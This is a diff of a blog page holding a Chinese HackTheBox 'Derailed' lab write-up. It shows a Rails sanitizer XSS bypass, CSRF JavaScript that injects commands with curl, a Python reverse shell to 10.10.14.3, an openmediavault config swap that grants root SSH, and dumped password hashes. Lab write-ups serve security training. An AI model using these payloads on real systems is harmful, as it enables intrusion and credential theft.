@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;512  10.10.11.190                                                                                                              端口扫描22和3000: 123456">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;512  10.10.11.190   端口扫描22和3000: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.190Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-11-26 2">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Derailed - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/11/28/Derailed-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;512  10.10.11.190                                                                                                              端口扫描22和3000: 123456">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;512  10.10.11.190   端口扫描22和3000: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.190Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-11-26 2">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112601.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112602.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112603.jpg">
@@ -124,8 +124,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -147,7 +154,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -215,70 +222,28 @@
 </li>
 <li><h2 id="10-10-11-190"><a href="#10-10-11-190" class="headerlink" title="10.10.11.190"></a>10.10.11.190</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112601.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112601.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和3000:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.190</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-26 20:26 CST</span><br><span class="line">Nmap scan report for 10.10.11.190</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 1623b09ade0e3492cb2b18170ff27b1a (RSA)</span><br><span class="line">|   256 50445e886b3e4b5bf9341dede52d91df (ECDSA)</span><br><span class="line">|_  256 0abd9223df44026f278da6abb4077837 (ED25519)</span><br><span class="line">3000/tcp open  http    nginx 1.18.0</span><br><span class="line">|_http-title: derailed.htb</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 287.58 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="3000"><a href="#3000" class="headerlink" title="3000"></a>3000</h2><p>clipnote：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112602.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112602.jpg" alt=""></p>
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>目录扫描发现rails,(最重要的是rails这个，dirsearch默认能扫出来，gobuster常规扫描没这个结果)：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://10.10.11.190:3000/</span><br><span class="line"></span><br><span class="line">/500                  (Status: 200) [Size: 1635]</span><br><span class="line">/404                  (Status: 200) [Size: 1722]</span><br><span class="line">/administration       (Status: 302) [Size: 96] [--&gt; http://10.10.11.190:3000/login]</span><br><span class="line">/favicon.ico          (Status: 200) [Size: 0]</span><br><span class="line">/logout               (Status: 302) [Size: 91] [--&gt; http://10.10.11.190:3000/]</span><br><span class="line">/login                (Status: 200) [Size: 5592]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 99]</span><br><span class="line">/register             (Status: 200) [Size: 5908]</span><br><span class="line"></span><br><span class="line">dirsearch -u http://10.10.11.190:3000/</span><br><span class="line"></span><br><span class="line">[20:10:32] 200 -    2KB - /rails/info/properties</span><br></pre></td></tr></table></figure>
 
 <h2 id="rails-info-properties"><a href="#rails-info-properties" class="headerlink" title="/rails/info/properties"></a>/rails/info/properties</h2><p>rails的环境变量等信息：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112603.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112603.jpg" alt=""></p>
 <h2 id="routes"><a href="#routes" class="headerlink" title="routes"></a>routes</h2><p>根据文档查看routes，得到所有路由信息：</p>
 <ul>
 <li>Class: Rails::InfoController — Documentation for rails/rails (main)<br><a href="https://www.rubydoc.info/github/rails/rails/Rails/InfoController" target="_blank" rel="noopener">https://www.rubydoc.info/github/rails/rails/Rails/InfoController</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112604.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112604.jpg" alt=""></p>
 <h2 id="clipnotes"><a href="#clipnotes" class="headerlink" title="clipnotes"></a>clipnotes</h2><p>随意测试提交，修改id为1知道alice用户：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112605.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112605.jpg" alt=""></p>
 <h2 id="report"><a href="#report" class="headerlink" title="report"></a>report</h2><p>另外存在report功能，应该是后端有个bot会查看我们提交的内容：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112606.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112606.jpg" alt=""></p>
 <h1 id="XSS-amp-CSRF"><a href="#XSS-amp-CSRF" class="headerlink" title="XSS &amp; CSRF"></a>XSS &amp; CSRF</h1><p>用到的漏洞是这个，因为cookie有httponly，所以需要结合csrf进行利用：</p>
 <ul>
 <li><p>1530898 Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag</p>
@@ -294,14 +259,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># &lt;any 40 characters&gt;&lt;bypass-pattern&gt;&lt;xss-payload&gt;</span><br><span class="line">miaomiaomiaomiaomiaomiaomiaomiaomiaomiao&lt;select&lt;style&#x2F;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.3:7777&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>xss payload作为用户名，任意内容提交report，测试执行，成功触发xss：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112607.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112607.jpg" alt=""></p>
 <p>后续就是一步步，通过xss获取信息,根据获取到的后台信息，我们知道需要获取有效的authenticity_token，然后csrf利用report_log处的命令注入：</p>
 <p>要发帖，我们需要先制作一个恶意表单，然后分配获取<code>authenticity_token</code>的和 cmd 注入负载</p>
 <p>最终构造出完整exp,整段js编码后注入到用户名中：</p>
@@ -311,25 +269,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">miaomiaomiaomiaomiaomiaomiaomiaomiaomiao&lt;select&lt;style&#x2F;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.3:7777&quot; onerror&#x3D;&quot;eval(String.fromCharCode(&lt;obfuscated-char-code&gt;))&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>测试，每一步都成功执行，包括测试的curl命令注入：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112608.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112608.jpg" alt=""></p>
 <h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>修改命令，得到reverse shell：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&#39;badform&#39;).elements.report_log.value &#x3D; &#39;|python3 -c \&#39;import pty;import socket,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.3&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;bash&quot;)\&#39;&#39;;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112609.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112609.jpg" alt=""></p>
 <h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><p>查看代码可以看到是直接用了ruby的open函数，特性导致的命令注入：</p>
 <ul>
 <li>Module: Kernel (Ruby 2.1.0)<br><a href="https://ruby-doc.org/core-2.1.0/Kernel.html#method-i-open" target="_blank" rel="noopener">https://ruby-doc.org/core-2.1.0/Kernel.html#method-i-open</a></li>
@@ -348,14 +292,7 @@
 <h2 id="exp-js"><a href="#exp-js" class="headerlink" title="exp.js"></a>exp.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlHttp.open( <span class="string">"GET"</span>, <span class="string">"http://derailed.htb:3000/administration"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlHttp.send( <span class="literal">null</span> );</span><br><span class="line"><span class="comment">// send a signal to indicate which step has been achieved</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="built_in">document</span>.createElement(<span class="string">"IMG"</span>);</span><br><span class="line">x.src = <span class="string">'http://10.10.14.3:7777/?step1'</span>;</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// send a signal to indicate which step has been achieved</span></span><br><span class="line">    <span class="keyword">var</span> x = <span class="built_in">document</span>.createElement(<span class="string">"IMG"</span>);</span><br><span class="line">    x.src = <span class="string">'http://10.10.14.3:7777/?step2'</span>;</span><br><span class="line">    <span class="comment">// fetch the token</span></span><br><span class="line">    <span class="keyword">var</span> doc = <span class="keyword">new</span> DOMParser().parseFromString(xmlHttp.responseText, <span class="string">'text/html'</span>);</span><br><span class="line">    <span class="keyword">var</span> token = doc.getElementById(<span class="string">'authenticity_token'</span>).value;</span><br><span class="line">    <span class="comment">// craft the form</span></span><br><span class="line">    <span class="keyword">var</span> newForm = <span class="keyword">new</span> DOMParser().parseFromString(<span class="string">'&lt;form id="badform" method="post" action="/administration/reports"&gt;    &lt;input type="hidden" name="authenticity_token" id="authenticity_token" value="placeholder" autocomplete="off"&gt;    &lt;input id="report_log" type="text" class="form-control" name="report_log" value="placeholder" hidden=""&gt;    &lt;button name="button" type="submit"&gt;Submit&lt;/button&gt;'</span>, <span class="string">'text/html'</span>);</span><br><span class="line">    <span class="built_in">document</span>.body.append(newForm.forms.badform);</span><br><span class="line">    <span class="comment">// assign the values</span></span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'badform'</span>).elements.report_log.value = <span class="string">'|curl http://10.10.14.3:7777/?cmdi'</span>;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'badform'</span>).elements.authenticity_token.value = token;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'badform'</span>).submit();</span><br><span class="line">&#125;, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>rails用户shell中写公钥后ssh连接，方便后续操作，rails用户目录得到user flag:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112611.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112611.jpg" alt=""></p>
 <h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>/var/www/rails-app/db/development.sqlite3中可以得到两个hash：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select username,password_digest,role from users <span class="built_in">where</span> id&lt;5;</span></span><br><span class="line">select username,password_digest,role from users where id&lt;5;</span><br><span class="line">alice|$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI7.|administrator</span><br><span class="line">toby|$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle|user</span><br></pre></td></tr></table></figure>
 
@@ -368,14 +305,7 @@
 <h2 id="openmediavault-webgui"><a href="#openmediavault-webgui" class="headerlink" title="openmediavault-webgui"></a>openmediavault-webgui</h2><p>查看存在的用户，得到的toby密码可以切换到openmediavault-webgui：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rails@derailed:/var/www/rails-app$ cat /etc/passwd | grep bash</span><br><span class="line">cat /etc/passwd | grep bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">openmediavault-webgui:x:999:996:Toby Wright,,,:/home/openmediavault-webgui:/bin/bash</span><br><span class="line">rails:x:1000:100::/home/rails:/bin/bash</span><br><span class="line">marcus:x:1001:1002:,,,:/home/marcus:/bin/bash</span><br><span class="line"></span><br><span class="line">su - openmediavault-webgui</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112610.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112610.jpg" alt=""></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openmediavault-webgui@derailed:~$ ls -al /etc/openmediavault/config.xml</span><br><span class="line">-rw-rw---- 1 root openmediavault-config 18838 May 30 07:13 /etc/openmediavault/config.xml</span><br></pre></td></tr></table></figure>
 
 <p>omv 工具存储在<code>/usr/sbin/</code>. 由于此应用程序用于管理对资源的访问控制。我们可以使用它为高权限用户添加新的访问方法。在这种情况下，我们可以让 root 用户接受我们的<code>public ssh key</code>，这样我们就可以以 root 身份通过 ssh 进入目标</p>
@@ -383,32 +313,11 @@
 <li>[GUIDE] Enable SSH with Public Key Authentication (Securing remote webUI access to OMV) - Guides - openmediavault<br><a href="https://forum.openmediavault.org/index.php?thread/7822-guide-enable-ssh-with-public-key-authentication-securing-remote-webui-access-to/" target="_blank" rel="noopener">https://forum.openmediavault.org/index.php?thread/7822-guide-enable-ssh-with-public-key-authentication-securing-remote-webui-access-to/</a></li>
 </ul>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>按照文档转换ssh公钥格式，修改配置文件，例如把test user修改为root ssh登录，然后替换配置文件，应用生效，登录:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112614.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112614.jpg" alt=""></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">ssh-keygen -e -f ~/.ssh/id_rsa.pub</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">wget http://10.10.14.3:7777/config.xml -O /etc/openmediavault/config.xml</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果格式错误的话，直接在靶机上编辑</span></span><br><span class="line">nano /etc/openmediavault/config.xml</span><br><span class="line"></span><br><span class="line">/usr/sbin/omv-confdbadm read conf.system.usermngmnt.user</span><br><span class="line"></span><br><span class="line">/usr/sbin/omv-rpc -u admin "config" "applyChanges" "&#123; \"modules\": [\"ssh\"],\"force\": true &#125;"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">ssh root@10.10.11.190</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112612.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112613.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112612.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112613.jpg" alt=""></p>
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$4H76C3VvReuiPfwg2kJ8T&#x2F;$UAFsX2eC7xz.RgSYn.wNsvbIagSoGNBaoh.0&#x2F;aNhrf4:19142:0:99999:7:::</span><br><span class="line">openmediavault-webgui:$y$j9T$5FjjCWAt5JVaJCyw&#x2F;KHjG1$6yADlnRZw4SaNH2XhzZKUoRrfQ5onFI1NlJf6TJvaa&#x2F;:19142::::::</span><br><span class="line">admin:$y$j9T$PHYLhHAg5Wed7QQtpsP0f&#x2F;$UJgxXh80c.lnsQD5XsEs3chxm8mgMYSieH2co43LBm6:19142::::::</span><br><span class="line">rails:$y$j9T$XKsVDJvXU7bCdmtkyEbYw.$4NTgDJCx3bQpd7hK9WATNhDGXvrcOa0Kqk80xsvvV01:19142:0:99999:7:::</span><br><span class="line">marcus:$y$j9T$.lfKUaVKg3P24jmnZrODU&#x2F;$RfQgNk01oAIKipNEBeFxX6Uv9UvI6CpRCiXun.3loUA:19316:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
@@ -438,7 +347,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-07-24T01:20:02.840Z" itemprop="dateUpdated">2023-07-24 09:20:02</time>
+    Last updated: <time datetime="2023-07-24T01:20:02.840Z" itemprop="dateUpdated">2023-07-24 09:20:02</time>
 </span><br>
 
 
@@ -605,11 +514,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
